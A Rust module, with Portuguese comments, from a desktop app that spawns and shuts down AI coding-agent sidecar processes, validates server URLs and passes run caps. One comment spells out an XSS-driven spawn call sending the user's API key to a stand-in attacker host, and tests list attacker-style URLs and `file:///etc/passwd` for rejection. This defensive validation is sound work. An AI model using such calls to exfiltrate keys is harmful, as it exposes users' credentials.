//! The agent session: one engine process per window (`Sidecars`), started by `spawn` with the
//! fence, the account and the Run's flags, fed by `send`, and ended politely before it is
//! killed (`encerrar_com_prazo`). A window that reloads or closes ends its own agent.
//! Split out of `code_bridge.rs` in 1.6.41.

use super::*;

/// Um sidecar `anna` de uma janela (uma sessão code ativa por janela). `gen` é a
/// geração da sessão — a thread de stdout usa pra saber se ainda é a sessão viva.
pub(super) struct Sidecar {
    child: Child,
    stdin: ChildStdin,
    gen: u64,
}

/// How long an engine gets to leave on its own before it is killed (1.6.29).
pub(super) const PRAZO_PARA_SAIR: std::time::Duration = std::time::Duration::from_secs(2);

/// Ends a sidecar the way a person would: ask, wait, then force (1.6.29).
///
/// `child.kill()` alone is SIGKILL on Unix (TerminateProcess on Windows): the engine got no
/// chance to run its exit path, so the Claude SDK's cleanup of the `claude` CLI it spawned
/// (`process.on("exit")`), the Codex runner's `encerrar` (which kills `codex app-server`), and a
/// running tool (`npm run dev`, `cargo test`) were skipped — orphans holding ports and locks.
/// Every engine leaves on `{"type":"exit"}` or on stdin EOF: this sends the first, closes stdin,
/// polls for `prazo`, and only then kills.
pub(super) fn encerrar_com_prazo(sc: Sidecar, prazo: std::time::Duration) {
    encerrar_varios_com_prazo(vec![sc], prazo);
}

/// The same for several at once, under ONE deadline (the app's exit must not wait 2 s each).
pub(super) fn encerrar_varios_com_prazo(varios: Vec<Sidecar>, prazo: std::time::Duration) {
    let mut filhos: Vec<Child> = varios
        .into_iter()
        .map(|sc| {
            let Sidecar { child, mut stdin, .. } = sc;
            let _ = writeln!(stdin, r#"{{"type":"exit"}}"#);
            let _ = stdin.flush();
            drop(stdin); // EOF, for an engine that only watches stdin
            child
        })
        .collect();
    let inicio = std::time::Instant::now();
    while inicio.elapsed() < prazo {
        filhos.retain_mut(|c| !matches!(c.try_wait(), Ok(Some(_))));
        if filhos.is_empty() {
            return;
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    for mut c in filhos {
        let _ = c.kill();
        let _ = c.wait();
    }
}

/// Registro de sidecars por rótulo de janela — em Tauri managed state.
/// Cada entrada fica em `Option<Sidecar>` para que `send_line` consiga TIRAR
/// o sidecar do mapa sob o lock, escrever no stdin FORA do lock (o pipe pode
/// bloquear se o anna estiver ocupado), e devolver a entrada no lock de novo.
#[derive(Default)]
pub struct Sidecars {
    map: Mutex<HashMap<String, Option<Sidecar>>>,
    next_gen: AtomicU64,
}

impl Sidecars {
    pub(super) fn kill_label(&self, label: &str) {
        // Remove sob o lock, mas mata/espera FORA dele — child.wait() pode bloquear
        // e seguraria o Mutex global (send/insert de outras janelas travariam).
        let sc = self
            .map
            .lock()
            .ok()
            .and_then(|mut m| m.remove(label))
            .and_then(|opt| opt);
        // Off the calling thread: this runs on "Parar", on a reload and on window close, all
        // on the UI thread, and the engine gets up to PRAZO_PARA_SAIR to leave on its own.
        if let Some(sc) = sc {
            std::thread::spawn(move || encerrar_com_prazo(sc, PRAZO_PARA_SAIR));
        }
    }

    /// Mata o sidecar de UMA janela (fechou a janela).
    pub fn kill_one(&self, label: &str) {
        self.kill_label(label);
    }

    /// Há sessão do Code viva nesta janela?
    ///
    /// Existe para o guard de fechamento (`decidir_fechar`): fechar com `anna` no ar
    /// perde a sessão **e** deixa o processo órfão. Medido em 20/08/2026 nesta máquina:
    /// **dois** `anna` vivos e um `shvia-desktop` zumbi desde 06/08 — órfão não é
    /// hipótese, é o estado atual.
    ///
    /// `Some(None)` no mapa é sessão em criação (o slot é reservado antes do spawn), e
    /// conta como viva de propósito: perguntar de graça é barato, fechar por cima de um
    /// spawn em curso deixa exatamente o órfão que este guard existe para evitar.
    pub fn tem_sessao(&self, label: &str) -> bool {
        self.map.lock().map(|m| m.contains_key(label)).unwrap_or(false)
    }

    /// Mata todos (saída do app — anti-órfão).
    pub fn kill_all(&self) {
        let drained: Vec<Sidecar> = self
            .map
            .lock()
            .ok()
            .map(|mut m| {
                m.drain()
                    .filter_map(|(_, opt)| opt)
                    .collect()
            })
            .unwrap_or_default();
        // At app exit, synchronously: a thread would die with the process. One shared
        // deadline for all of them.
        encerrar_varios_com_prazo(drained, PRAZO_PARA_SAIR);
    }

    /// Registra o sidecar da janela (nova geração), matando o anterior (troca de
    /// sessão). Devolve a geração desta sessão.
    fn insert(&self, label: String, child: Child, stdin: ChildStdin) -> u64 {
        let gen = self.next_gen.fetch_add(1, Ordering::Relaxed) + 1;
        let old = self.map.lock().ok().and_then(|mut m| {
            m.insert(
                label,
                Some(Sidecar {
                    child,
                    stdin,
                    gen,
                }),
            )
        });
        if let Some(Some(old)) = old {
            std::thread::spawn(move || encerrar_com_prazo(old, PRAZO_PARA_SAIR));
        }
        gen
    }

    /// Colhe o sidecar desta geração e devolve o **código de saída** dele.
    ///
    /// `None` = esta geração já não é a sessão viva (respawn ou kill), e nesse caso o
    /// chamador não deve sinalizar nada — é a mesma guarda que o `is_current` fazia.
    /// `Some(None)` = era a sessão viva, mas o código não pôde ser lido.
    ///
    /// 🔴 Existe porque o `exited` era mudo. A ponte descobria a morte pelo stdout
    /// fechando e emitia `{type:'exited'}` sem mais nada — o que serve enquanto todo
    /// motor morre por um motivo só. O `codex-runner` morre por DOIS: acabou, ou
    /// recusou subir porque o sandbox não segurou. Sem o código, a tela conta os dois
    /// como a mesma coisa, e o segundo é justamente o que o usuário precisa ler.
    ///
    /// Remove sob o lock e espera FORA dele, pela mesma razão do `kill_label`:
    /// `wait()` pode bloquear e seguraria o Mutex global.
    fn colher(&self, label: &str, gen: u64) -> Option<Option<i32>> {
        let sc = {
            let mut m = self.map.lock().ok()?;
            match m.get(label).and_then(|opt| opt.as_ref()) {
                Some(sc) if sc.gen == gen => m.remove(label).and_then(|opt| opt),
                _ => return None,
            }
        };
        let mut sc = sc?;
        Some(sc.child.wait().ok().and_then(|st| st.code()))
    }

    /// Escreve uma linha no stdin do sidecar da janela (mensagem ou decisão).
    /// `false` = não havia sessão viva ou a escrita falhou (o host então sabe que
    /// a decisão/mensagem caiu, em vez de assumir ok).
    ///
    /// Importante: o `writeln!+flush` acontece FORA do Mutex global — se o pipe
    /// do anna encher (tool longa, gate bloqueante), só esta chamada trava;
    /// outras janelas e o spawn/kill continuam funcionando.
    fn send_line(&self, label: &str, line: &str) -> bool {
        let mut sidecar = match self.map.lock() {
            Ok(mut map) => match map.get_mut(label) {
                Some(slot) => slot.take(),
                None => None,
            },
            Err(_) => None,
        };
        let Some(mut sc) = sidecar.take() else {
            return false;
        };
        let ok = writeln!(sc.stdin, "{line}").and_then(|_| sc.stdin.flush()).is_ok();
        if let Ok(mut map) = self.map.lock() {
            if let Some(slot) = map.get_mut(label) {
                *slot = Some(sc);
            }
            // Se a janela foi removida entre os dois locks, recria sem gravar
            // de volta (a sessão está morta). Sem leak: o Child morre no drop.
        }
        ok
    }
}

/// `true` se `url` for um endereço https de um host do servidor do ShvIA
/// (`crate::SERVER_HOSTS`). Usada para validar o campo `url` que a PÁGINA manda no
/// `spawn` — a mesma allowlist exata de `is_internal` e de
/// `windows_ipc::ALLOWED_MESSAGE_ORIGINS`, para o perímetro ter uma resposta só.
///
/// Compara HOST parseado, nunca prefixo de string: `starts_with` deixaria passar
/// `https://ai.shvia.org.atacante.tld`, que é outro domínio.
pub(super) fn url_do_servidor(url: &str) -> bool {
    match url.parse::<tauri::Url>() {
        Ok(u) => u.scheme() == "https" && u.host_str().is_some_and(crate::is_server_host),
        Err(_) => false,
    }
}

/// The Run's flags for the Claude runner (RUN-20260910, B3), from the `autonomy` object
/// the page sends in `spawn`: `{stopByHost: bool, maxIterations: n, maxCostUsd: x}`.
///
/// Absent object → no flag, and the runner behaves as before 1.5.0: it never emits
/// `stop_request` and sets no cap. Presence, not a version number, is the gate — the
/// `recursos.run` flag in the shim is how the page learns this shell knows the field.
///
/// A value that is not a positive number is DROPPED, never coerced: a cap of 0 would end
/// every turn before it started, and the runner refuses it the same way (`parada.mjs`).
/// Two guards agreeing is not redundancy here — the flag crosses a process boundary, and
/// each side reads its own input.
pub(super) fn argumentos_da_run(autonomy: Option<&serde_json::Value>) -> Vec<String> {
    let mut args: Vec<String> = Vec::new();
    let Some(a) = autonomy.filter(|a| a.is_object()) else {
        return args;
    };
    if a.get("stopByHost").and_then(|x| x.as_bool()).unwrap_or(false) {
        args.push("--parada".into());
        args.push("host".into());
    }
    if let Some(n) = a
        .get("maxIterations")
        .and_then(|x| x.as_f64())
        .filter(|n| n.is_finite() && *n >= 1.0)
    {
        args.push("--teto-iteracoes".into());
        args.push((n.floor() as u64).to_string());
    }
    if let Some(c) = a
        .get("maxCostUsd")
        .and_then(|x| x.as_f64())
        .filter(|c| c.is_finite() && *c > 0.0)
    {
        args.push("--teto-custo".into());
        args.push(format!("{c}"));
    }
    args
}

pub(super) fn spawn(window: &WebviewWindow, req: &str, v: &serde_json::Value) {
    let s = |k: &str| v.get(k).and_then(|x| x.as_str()).unwrap_or_default().to_string();
    let dir = s("projectDir");
    if dir.is_empty() || !PathBuf::from(&dir).is_dir() {
        return reply(window, req, false, serde_json::json!({ "error": "pasta do projeto inválida" }));
    }
    // A cerca (F-12) vale para o agente também: o `projectDir` é onde ele vai LER e ESCREVER
    // por horas. Deixar a página escolher a raiz do agente seria a mesma porta do `readFile`,
    // com muito mais alcance — o gate do próprio `anna` confina na raiz que recebe daqui.
    if !pasta_autorizada(window, &dir) {
        return reply(
            window,
            req,
            false,
            serde_json::json!({ "error": "pasta não autorizada — escolha a pasta do projeto pelo botão do app" }),
        );
    }
    // Motor: "gateway" (anna, default) ou "claude" (claude-runner — Claude Code
    // com a ASSINATURA do usuário, FORA do gateway). Ambos falam o mesmo NDJSON
    // (embedding.md), então o bridge e a UI de cards não mudam. Sem `engine` = anna.
    let engine = s("engine");
    let is_claude = engine == "claude";
    let (exe_base, erro_ausente, cod_ausente) = motor_do_engine(&engine);
    let Some(bin) = resolve_bin(exe_base) else {
        return reply(window, req, false,
            serde_json::json!({ "error": erro_ausente, "codigo": cod_ausente }));
    };

    let mut cmd = Command::new(bin);
    cmd.current_dir(&dir);
    // App de GUI não herda o PATH do shell (ADR-029): sem isto o agente não
    // encontra npx/node/cargo/php e fica insistindo em comando que não existe.
    if let Some(p) = crate::user_env::sidecar_path() {
        cmd.env("PATH", p);
    }
    let (model, effort, url, key) = (s("model"), s("effort"), s("url"), s("apiKey"));

    // `url` vem da PÁGINA e viaja junto com SHVIA_API_KEY (a chave do usuário) —
    // então é entrada não confiável no caminho de um segredo, e passa pela MESMA
    // allowlist do resto do perímetro (`crate::SERVER_HOSTS`). Sem esta checagem,
    // um XSS na página do ShvIA — ou um asset de terceiro comprometido; a CSP do
    // web nasce DESLIGADA (SHVIA-WEB/config/security.php) — chamaria
    // `__shviaCode.spawn({url:'https://coletor.atacante.tld', apiKey:'…'})` e o
    // agente mandaria a chave em `X-API-Key` para lá. O anna só exige https, e
    // https qualquer atacante tem.
    //
    // Rejeitar é seguro para o uso legítimo: o web manda `location.origin`
    // (code-mode.js), e uma página que roda num host do servidor tem, por
    // definição, origem que passa. Falha ALTO em vez de cair no default
    // compilado — silenciar mandaria o turno para o host errado sem sintoma.
    if !url.is_empty() && !url_do_servidor(&url) {
        return reply(
            window,
            req,
            false,
            serde_json::json!({ "error": "url de servidor não autorizada" }),
        );
    }
    // Conta resolvida, para a resposta ecoar o que de fato valeu. Só o motor Claude tem
    // conta; no `anna` fica `None` e o campo não sai.
    let mut resolvida: Option<(String, String)> = None;
    if is_claude {
        // Assinatura via cliente oficial: NADA de SHVIA_API_KEY nem `--url` — este
        // motor não passa pelo gateway, então chave e endpoint do ShvIA não se
        // aplicam e mandá-los seria vazar credencial para fora do perímetro dele.
        //
        // `--model` e `--effort` SIM (21/08) — mas **só quando a página garante
        // que vieram do catálogo do Claude**, via `modelDoClaude: true`.
        //
        // Sem essa trava a correção viraria regressão: até agora o modelo era
        // lido e descartado aqui, então a UI mandando `openai/gpt-5.6-sol` (o
        // catálogo do GATEWAY, que é o que ela ainda mostra com o motor Claude
        // ativo) não fazia mal nenhum. Repassar sem conferir trocaria "seletor que
        // não faz nada" por "sessão que não abre" — pior, porque quebra o que
        // funcionava.
        //
        // A trava é declarativa de propósito: nada de adivinhar pela forma do id
        // (`contém '/'`?), que erraria no primeiro alias novo. Quem sabe de qual
        // catálogo o valor saiu é quem montou o seletor, e ela diz.
        cmd.args(["--cwd", &dir]);
        // Conta de assinatura (ADR-033). A página manda um `accountId` da lista; quem o
        // traduz em `CLAUDE_CONFIG_DIR` é o `contas_claude::resolver` — o MESMO que o
        // `claudeModels` usa, para descoberta e turno não poderem divergir de conta.
        //
        // 🔴 Falha ALTO, sem fallback. Cair na conta padrão quando o id não resolve seria
        // rodar o turno numa assinatura que o usuário não escolheu, com a tela mostrando o
        // nome da que ele escolheu — e sob assinatura isso gasta a cota da conta errada.
        // Um erro na hora é barato; a sessão silenciosa na conta errada não é.
        let (contas, _) = crate::contas_claude::registro(window.app_handle());
        let account_id = v.get("accountId").and_then(|x| x.as_str()).unwrap_or_default();
        let conta_dir = match crate::contas_claude::resolver(&contas, account_id) {
            Ok(d) => d,
            Err(e) => {
                return reply(
                    window,
                    req,
                    false,
                    serde_json::json!({ "error": e.mensagem(), "codigo": e.codigo() }),
                )
            }
        };
        crate::contas_claude::aplicar(&mut cmd, conta_dir.as_ref());
        resolvida = contas
            .iter()
            .find(|c| c.id == if account_id.trim().is_empty() { crate::contas_claude::PADRAO } else { account_id.trim() })
            .map(|c| (c.id.clone(), c.rotulo.clone()));
        let do_claude = v.get("modelDoClaude").and_then(|x| x.as_bool()).unwrap_or(false);
        if do_claude && !model.is_empty() {
            cmd.args(["--model", &model]);
        }
        if do_claude && !effort.is_empty() {
            cmd.args(["--effort", &effort]);
        }
        // Aprovação NÃO depende de `modelDoClaude`: os níveis são os mesmos dos
        // dois motores (manual/edit/auto), implementados por código nosso — o
        // hook `PreToolUse` do runner, que é quem faz o cartão de aprovação
        // aparecer. Não há catálogo a conciliar aqui, então o valor passa direto.
        let aprovacao = s("approval");
        if !aprovacao.is_empty() {
            cmd.args(["--aprovacao", &aprovacao]);
        }
        // A Run (RUN-20260910, B3): the page arms the stop handshake and the caps. Only
        // the Claude runner knows these flags today; `anna` and the Codex runner continue
        // between turns, from the page, and receive nothing here.
        for a in argumentos_da_run(v.get("autonomy")) {
            cmd.arg(a);
        }
    } else if engine == "codex" {
        if !v.get("modelDoCodex").and_then(|x| x.as_bool()).unwrap_or(false) || model.is_empty() {
            return reply(
                window,
                req,
                false,
                serde_json::json!({ "error": "Carregue o catálogo do Codex antes de enviar." }),
            );
        }
        cmd.args(["--cwd", &dir, "--model", &model]);
        if !effort.is_empty() {
            cmd.args(["--effort", &effort]);
        }
    } else {
        cmd.arg("--json").args(["--tools", "local"]);
        if !model.is_empty() {
            cmd.args(["--model", &model]);
        }
        if !effort.is_empty() {
            cmd.args(["--effort", &effort]);
        }
        if !url.is_empty() {
            cmd.args(["--url", &url]);
        }
        if !key.is_empty() {
            cmd.env("SHVIA_API_KEY", &key); // chave do usuário, repassada pelo web (nunca logada)
        }
    }
    cmd.stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped());

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        // `exe_base`, não "anna" cravado: com o motor Claude ativo a frase nomeava o outro
        // binário, e esta é exatamente a mensagem que aparece quando um perfil de conta não
        // sobe (ADR-033). Mandar quem procura o defeito olhar o motor errado custa a sessão
        // inteira de diagnóstico.
        Err(e) => {
            return reply(
                window,
                req,
                false,
                serde_json::json!({ "error": format!("falha ao iniciar {exe_base}: {e}") }),
            )
        }
    };
    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");
    let stdin = child.stdin.take().expect("stdin piped");

    // Guarda no state, matando um sidecar anterior desta janela (troca de sessão).
    // A geração desta sessão acompanha a thread de stdout (guarda o 'exited').
    let label = window.label().to_string();
    let gen = window.app_handle().state::<Sidecars>().insert(label.clone(), child, stdin);

    // stderr → log do app (nunca a timeline).
    let tag = exe_base.to_string();
    std::thread::spawn(move || {
        for line in BufReader::new(stderr).lines().map_while(Result::ok) {
            eprintln!("[{tag}] {line}");
        }
    });

    // stdout NDJSON → evento na página (`_emit`), no main thread (WebKit).
    let win = window.clone();
    let exit_label = label;
    std::thread::spawn(move || {
        let app = win.app_handle().clone();
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if line.trim().is_empty() {
                continue;
            }
            let js = format!("window.__shviaCode&&window.__shviaCode._emit(JSON.parse({}))", js_str(&line));
            let w = win.clone();
            let _ = app.run_on_main_thread(move || {
                let _ = w.eval(&js);
            });
        }
        // stdout fechou → anna saiu. Só sinaliza 'exited' se ESTA geração ainda é a
        // sessão viva da janela; se foi substituída (respawn) ou morta (kill/troca
        // de projeto), fica quieta pra não derrubar a sessão nova que acabou de subir.
        if let Some(codigo) = app.state::<Sidecars>().colher(&exit_label, gen) {
            // O motivo vai junto do evento. `sandbox_nao_confirmado` é estado NOMEADO,
            // não "motor indisponível": o binário existe, respondeu e se recusou a
            // servir porque a garantia dele não vale nesta máquina. Tratar isso como
            // ausência mandaria reinstalar o que já está instalado.
            let motivo = match codigo {
                Some(SAIDA_SANDBOX_NAO_CONFIRMADO) => "sandbox_nao_confirmado",
                Some(0) | None => "fim",
                Some(_) => "erro",
            };
            let js = format!(
                "window.__shviaCode&&window.__shviaCode._emit({{type:'exited',reason:{},code:{}}})",
                js_str(motivo),
                codigo.map_or("null".to_string(), |c| c.to_string()),
            );
            let w = win.clone();
            let _ = app.run_on_main_thread(move || {
                let _ = w.eval(&js);
            });
        }
    });

    // O eco da conta resolvida fecha o laço: a página pediu um id e fica sabendo qual
    // valeu, em vez de supor que o pedido foi obedecido. Não existe evento `ready` neste
    // protocolo (os canais são `_reply`, stderr→log e stdout NDJSON→`_emit`), e inventar um
    // mudaria o `embedding.md`, que é contrato dos DOIS motores — a resposta do `spawn` é
    // o lugar que já existe para isto.
    let mut resposta = serde_json::json!({ "ok": true });
    if let Some((id, rotulo)) = resolvida {
        resposta["accountId"] = serde_json::json!(id);
        resposta["accountLabel"] = serde_json::json!(rotulo);
    }
    reply(window, req, true, resposta);
}

pub(super) fn send(window: &WebviewWindow, v: &serde_json::Value) -> bool {
    let line = match v.get("payload") {
        Some(p) => serde_json::to_string(p).unwrap_or_default(),
        None => return false,
    };
    window.app_handle().state::<Sidecars>().send_line(window.label(), &line)
}

#[cfg(test)]
mod tests_encerrar {
    #[cfg(unix)]
    use super::{encerrar_com_prazo, Sidecar};
    #[cfg(unix)]
    use std::process::{Command, Stdio};
    #[cfg(unix)]
    use std::time::{Duration, Instant};

    #[cfg(unix)]
    fn sidecar(script: &str, arg: &str) -> Sidecar {
        let mut child = Command::new("sh")
            .args(["-c", script, "sh", arg])
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .spawn()
            .unwrap();
        let stdin = child.stdin.take().unwrap();
        Sidecar { child, stdin, gen: 1 }
    }

    /// 🔴 1.6.29. "Parar" was SIGKILL: the engine never ran its exit path (the SDK's cleanup of
    /// the `claude` CLI, the Codex runner killing its app-server). An engine that leaves on
    /// `{"type":"exit"}` must get that message and leave on its own, well before the deadline.
    #[cfg(unix)]
    #[test]
    fn motor_que_sabe_sair_recebe_o_pedido_e_sai_sozinho() {
        let marca = std::env::temp_dir().join(format!("shvia-saida-{}", std::process::id()));
        let _ = std::fs::remove_file(&marca);
        let sc = sidecar(r#"while read l; do case "$l" in *exit*) echo pediu > "$1"; exit 0;; esac; done"#, &marca.to_string_lossy());
        let t = Instant::now();
        encerrar_com_prazo(sc, Duration::from_secs(5));
        assert!(t.elapsed() < Duration::from_secs(3), "waited {:?} for an engine that leaves on request", t.elapsed());
        assert_eq!(std::fs::read_to_string(&marca).unwrap_or_default().trim(), "pediu", "the engine never got the exit request");
        let _ = std::fs::remove_file(&marca);
    }

    /// …and one that ignores it is still killed and reaped once the deadline passes.
    #[cfg(unix)]
    #[test]
    fn motor_que_nao_sai_morre_no_prazo() {
        let sc = sidecar("sleep 30", "");
        let pid = sc.child.id();
        let t = Instant::now();
        encerrar_com_prazo(sc, Duration::from_millis(300));
        assert!(t.elapsed() < Duration::from_secs(3), "took {:?}", t.elapsed());
        #[cfg(target_os = "linux")]
        assert!(!std::path::Path::new(&format!("/proc/{pid}")).exists(), "the stubborn engine is still alive (or a zombie)");
        let _ = pid;
    }
}

#[cfg(test)]
mod tests_url_servidor {
    use super::url_do_servidor;

    /// O caminho legítimo: o web manda `location.origin` da página do ShvIA.
    #[test]
    fn origens_do_servidor_passam() {
        assert!(url_do_servidor("https://ai.shvia.org"));
        assert!(url_do_servidor("https://ia.shvia.org"));
        assert!(url_do_servidor("https://ia.blue3.com.br"));
    }

    /// `url` viaja junto com SHVIA_API_KEY: um host de fora aqui é exfiltração da
    /// chave do usuário. Nada além do servidor entra, nem por sufixo, nem por
    /// esquema fraco, nem o ápex (que é a landing, em outro IP).
    #[test]
    fn qualquer_outra_coisa_e_rejeitada() {
        assert!(!url_do_servidor("https://coletor.atacante.tld"));
        assert!(!url_do_servidor("https://ai.shvia.org.atacante.tld"));
        assert!(!url_do_servidor("https://shvia.org"));
        assert!(!url_do_servidor("https://evil.shvia.org"));
        assert!(!url_do_servidor("http://ai.shvia.org")); // sem TLS
        assert!(!url_do_servidor("file:///etc/passwd"));
        assert!(!url_do_servidor("nao-e-url"));
        assert!(!url_do_servidor(""));
    }
}

#[cfg(test)]
mod tests_run {
    use super::*;

    /// No `autonomy` → no flag. The page of yesterday spawns exactly what it spawned.
    #[test]
    fn sem_autonomy_nenhuma_flag() {
        assert!(argumentos_da_run(None).is_empty());
        assert!(argumentos_da_run(Some(&serde_json::json!("nao-e-objeto"))).is_empty());
        assert!(argumentos_da_run(Some(&serde_json::json!({}))).is_empty());
    }

    /// The armed run becomes the three flags the runner reads (`parada.mjs`).
    #[test]
    fn a_run_armada_vira_as_tres_flags() {
        let v = serde_json::json!({ "stopByHost": true, "maxIterations": 100, "maxCostUsd": 5 });
        assert_eq!(
            argumentos_da_run(Some(&v)),
            vec!["--parada", "host", "--teto-iteracoes", "100", "--teto-custo", "5"]
        );
        // A fractional cost keeps its decimals; a fractional iteration count floors.
        let v = serde_json::json!({ "maxIterations": 2.9, "maxCostUsd": 0.5 });
        assert_eq!(argumentos_da_run(Some(&v)), vec!["--teto-iteracoes", "2", "--teto-custo", "0.5"]);
    }

    /// 🔴 An invalid cap is dropped, never coerced to 0: `maxTurns: 0` would end every
    /// turn before it started, with the screen showing a run that "ran".
    #[test]
    fn teto_invalido_nao_vira_flag() {
        let v = serde_json::json!({ "stopByHost": false, "maxIterations": 0, "maxCostUsd": -1 });
        assert!(argumentos_da_run(Some(&v)).is_empty());
        let v = serde_json::json!({ "maxIterations": "cem", "maxCostUsd": "cinco", "stopByHost": "sim" });
        assert!(argumentos_da_run(Some(&v)).is_empty());
    }
}

#[cfg(test)]
// Split out of `tests_motor` in 1.6.41.
mod tests_colher {
    use super::*;

    /// AO VIVO: o `colher` espera um processo real e devolve o código dele.
    ///
    /// Não é teste de aritmética — é a coreografia que os defeitos desta frente
    /// moraram. Um processo que sai 3 tem de chegar como `Some(Some(3))`, e uma
    /// geração que já não é a viva tem de devolver `None` (senão o respawn derruba a
    /// sessão nova que acabou de subir).
    #[test]
    fn colher_le_o_codigo_de_um_processo_de_verdade() {
        use std::process::Stdio;
        let sc = Sidecars::default();

        let mut filho = Command::new("/bin/sh")
            .args(["-c", "exit 3"])
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .spawn()
            .expect("spawn do /bin/sh");
        let stdin = filho.stdin.take().expect("stdin");
        let gen = sc.insert("janela".into(), filho, stdin);

        assert_eq!(sc.colher("janela", gen), Some(Some(3)), "não leu o código real");
        // Colhido uma vez, some do mapa: a segunda chamada não é a sessão viva.
        assert_eq!(sc.colher("janela", gen), None);
    }

    #[test]
    fn colher_de_geracao_velha_nao_sinaliza() {
        use std::process::Stdio;
        let sc = Sidecars::default();
        let mut f1 = Command::new("/bin/sh").args(["-c", "exit 0"]).stdin(Stdio::piped()).spawn().unwrap();
        let s1 = f1.stdin.take().unwrap();
        let gen_velha = sc.insert("janela".into(), f1, s1);

        let mut f2 = Command::new("/bin/sh").args(["-c", "exit 0"]).stdin(Stdio::piped()).spawn().unwrap();
        let s2 = f2.stdin.take().unwrap();
        let gen_nova = sc.insert("janela".into(), f2, s2);

        // A thread de stdout do sidecar VELHO acorda depois do respawn. Se ela
        // sinalizasse, derrubaria a sessão nova — foi para isso que a geração existe.
        assert_eq!(sc.colher("janela", gen_velha), None, "geração velha sinalizou");
        assert!(sc.colher("janela", gen_nova).is_some());
    }
}
